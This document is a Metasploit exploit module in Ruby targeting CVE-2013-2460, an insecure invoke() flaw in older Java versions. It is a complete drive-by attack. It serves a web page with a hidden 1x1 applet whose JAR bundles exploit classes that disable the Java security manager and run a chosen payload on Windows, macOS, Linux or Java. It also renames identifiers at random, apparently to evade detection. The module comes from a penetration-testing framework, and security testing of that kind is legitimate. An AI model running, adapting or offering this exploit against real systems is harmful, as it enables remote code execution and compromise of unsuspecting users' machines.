##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking # Because there isn't click2play bypass, plus now Java Security Level High by default

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({ :javascript => false })

  EXPLOIT_STRING = "Exploit"

  def initialize( info = {} )

    super( update_info( info,
      'Name'          => 'Java Applet ProviderSkeleton Insecure Invoke Method',
      'Description'   => %q{
          This module abuses the insecure invoke() method of the ProviderSkeleton class that
        allows to call arbitrary static methods with user supplied arguments. The vulnerability
        affects Java version 7u21 and earlier.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Adam Gowdiak', # Vulnerability discovery according to Oracle's advisory and also POC
          'Matthias Kaiser' # Metasploit module
        ],
      'References'    =>
        [
          [ 'CVE', '2013-2460' ],
          [ 'OSVDB', '94346' ],
          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpujun2013-1899847.html'],
          [ 'URL', 'http://hg.openjdk.java.net/jdk7u/jdk7u/jdk/rev/160cde99bb1a' ],
          [ 'URL', 'http://www.security-explorations.com/materials/SE-2012-01-ORACLE-12.pdf' ],
          [ 'URL', 'http://www.security-explorations.com/materials/se-2012-01-61.zip' ]
        ],
      'Platform'      => [ 'java', 'win', 'osx', 'linux' ],
      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },
      'Targets'       =>
        [
          [ 'Generic (Java Payload)',
            {
              'Platform' => ['java'],
              'Arch' => ARCH_JAVA,
            }
          ],
          [ 'Windows x86 (Native Payload)',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X86,
            }
          ],
          [ 'Mac OS X x86 (Native Payload)',
            {
              'Platform' => 'osx',
              'Arch' => ARCH_X86,
            }
          ],
          [ 'Linux x86 (Native Payload)',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X86,
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 18 2013'
    ))
  end

  def randomize_identifier_in_jar(jar, identifier)
    identifier_str = rand_text_alpha(identifier.length)
    jar.entries.each { |entry|
      entry.name.gsub!(identifier, identifier_str)
      entry.data = entry.data.gsub(identifier, identifier_str)
    }
  end


  def setup
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-2460", "Exploit.class")
    @exploit_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-2460", "ExpProvider.class")
    @provider_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-2460", "DisableSecurityManagerAction.class")
    @action_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }

    @exploit_class_name = rand_text_alpha(EXPLOIT_STRING.length)
    @exploit_class.gsub!(EXPLOIT_STRING, @exploit_class_name)

    super
  end

  def on_request_uri(cli, request)
    print_status("handling request for #{request.uri}")

    case request.uri
    when /\.jar$/i
      jar = payload.encoded_jar
      jar.add_file("#{@exploit_class_name}.class", @exploit_class)
      jar.add_file("ExpProvider.class", @provider_class)
      jar.add_file("DisableSecurityManagerAction.class", @action_class)
      randomize_identifier_in_jar(jar, "metasploit")
      randomize_identifier_in_jar(jar, "payload")
      jar.build_manifest

      send_response(cli, jar, { 'Content-Type' => "application/octet-stream" })
    when /\/$/
      payload = regenerate_payload(cli)
      if not payload
        print_error("Failed to generate the payload.")
        send_not_found(cli)
        return
      end
      send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })
    else
      send_redirect(cli, get_resource() + '/', '')
    end

  end

  def generate_html
    html = %Q|
    <html>
    <body>
    <applet archive="#{rand_text_alpha(rand(5) + 3)}.jar" code="#{@exploit_class_name}.class" width="1" height="1"></applet>
    </body>
    </html>
    |
    return html
  end

end
